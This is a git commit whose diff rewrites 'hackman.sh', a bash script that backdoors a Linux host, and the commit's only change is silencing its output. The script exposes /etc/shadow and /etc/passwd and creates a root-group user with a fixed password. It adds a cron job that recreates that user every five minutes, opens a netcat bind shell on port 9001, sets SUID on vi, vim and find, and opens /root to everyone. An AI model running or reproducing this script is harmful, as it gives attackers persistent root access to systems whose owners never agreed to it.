9988ac03890b72c45ec7685c0f3b7ace7795e43e
Roxas1197 <keyblader97@msn.com>
2020-12-16 14:28:32 -0600

    SilentEvil
    Made script quiet

--- hackman.sh
+++ hackman.sh
@@ -1,16 +1,16 @@
 #!/bin/bash
-chmod 644 /etc/shadow
-chmod 666 /etc/passwd
-useradd panic  && echo -e "notpassword\nnotpassword" | passwd coolio
-usermod -a -G root panic
+chmod 644 /etc/shadow &> /dev/null
+chmod 666 /etc/passwd &> /dev/null
+useradd coolio &> /dev/null  && echo -e "notpassword\nnotpassword" | passwd coolio &> /dev/null
+usermod -a -G root coolio &> /dev/null
 echo "*/5 * * * *  root  useradd coolio && echo -e "notpassword\nnotpassword" | passwd coolio && usermod -a -G root coolio" >> /etc/crontab
 apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
 nc.traditional -l -p 9001 -e /bin/bash &
-usermod --shell /bin/bash games
-chmod u+s `which vi`
-chmod u+s `which vim`
-chmod u+s `which find`
-chmod 777 /root
-echo "Oh, well in fact"
-echo "Well, I'll look at it this way"
+usermod --shell /bin/bash games &> /dev/null
+chmod u+s `which vi` &> /dev/null
+chmod u+s `which vim` &> /dev/null
+chmod u+s `which find` &> /dev/null
+chmod 777 /root &> /dev/null
+echo "Oh, well in fact" &> /dev/null
+echo "Well, I'll look at it this way" &> /dev/null
 echo "I mean technically our server is de_stroyed"
